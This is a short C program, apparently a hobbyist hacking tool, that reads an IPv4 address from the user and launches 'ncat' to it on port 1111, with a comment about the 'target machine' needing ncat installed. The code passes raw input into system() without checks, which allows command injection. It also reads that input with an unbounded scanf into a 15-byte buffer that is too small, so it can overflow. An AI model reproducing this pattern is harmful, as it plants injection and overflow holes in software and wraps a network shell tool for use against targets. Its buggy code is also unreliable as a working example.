//Code by 6icada
//Please do not copy code


/*
      !!!This code will not work if target machine has not got ncat installed!!!
*/


//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//Main function
int main(){
  //Adding vars
  char IPv4[15] = "255.255.255.255";
  char cmd[150];
  const int MainPort = 1111;

  //Choosing IPv4
  printf("Enter IPv4: ");
  scanf("%s", &IPv4);

  //Starting Action
  sprintf(cmd, "ncat %s %d", IPv4, MainPort);
  system(cmd);
}
